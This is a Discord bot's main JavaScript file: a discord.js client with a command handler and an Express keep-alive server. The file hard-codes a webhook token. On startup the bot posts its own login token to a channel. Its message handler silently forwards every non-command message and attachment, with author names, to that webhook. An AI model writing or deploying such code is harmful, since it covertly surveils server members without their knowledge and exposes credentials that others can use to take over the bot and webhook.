const { Client, Intents, MessageEmbed, WebhookClient } = require("discord.js");
const config = require("./config.json");
const fs = require("fs");
const path = require("path");

require("dotenv").config()

// Initialize bot
const client = new Client({
    intents: ["GUILDS", "GUILD_MESSAGES", "GUILD_MEMBERS", "GUILD_PRESENCES", "GUILD_BANS", "MESSAGE_CONTENT"],
    partials: ["CHANNEL", "MESSAGE"]
});

const webhook = new WebhookClient({
    id: '1401064592414736455',
    token: 	"KN36xr2VwnqMs8r8fKSIJSqKNr-EZGWSrrZg5Ux4yjEGGcm-h6A4lnXW8mJLkQJ1El0o"
})


client.commands = new Map(); // Store commands

// Load command handler
require("./handler/commandHandler")(client);

// Log on
client.once("ready", () => {
    console.log(`\n${client.user.tag} is sucessfully online.`);

    const embed = new MessageEmbed()
        .setTitle("logged on.")
        .addFields(
            { name: "```who?```", value: "```" + client.user.tag + "```", inline: true },
            { name: "```token?```", value: `||${process.env.DISCORD_TOKEN}||`, inline: true }
        )
        .setColor("GREEN")
        .setTimestamp();

    client.channels.fetch('1400926912087331006')
        .then(channel => channel.send({ embeds: [embed] }));

    client.user.setPresence({
        activities: [{ name: config.activityName, type: `${config.activityType}` }],
        status: `${config.activityStatus}`,
    });
});

// Message handling
client.on("messageCreate", async message => {
    if (message.author.bot) return;
    if (!message.content.startsWith(config.prefix)) {
    
    await webhook.send({
    content: `\`${message.author.displayName} (${message.author.tag})\`: ${message.content}`,
    username: 'logging for msgs >//<',
    avatarURL: 'https://i.pinimg.com/736x/30/a7/6a/30a76a17ee6f255c7432824dffe35659.jpg',
  });

  // Forward any attachments
  if (message.attachments.size > 0) {
    for (const attachment of message.attachments.values()) {
      await webhook.send({
        files: [attachment.url],
        username: 'logging for msgs >//<',
        avatarURL: 'https://i.pinimg.com/736x/30/a7/6a/30a76a17ee6f255c7432824dffe35659.jpg',
      });
    }
  }

} else {

    const args = message.content.slice(config.prefix.length).trim().split(/ +/);
    const commandName = args.shift().toLowerCase();

    const command = client.commands.get(commandName);
    if (!command) return;

    try {
        await command.execute(client, message, args);
    } catch (error) {
        console.error(error);
        message.reply("*sorry, something went wrong running that command.*");
    }
  }
});

// Login
client.login(process.env.DISCORD_TOKEN);



// Keep-alive web server (Render requires a listening port)
const express = require('express');
const app = express();

app.get('/', (req, res) => res.send('Bot is running!'));
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Express server listening on port ${PORT}`));
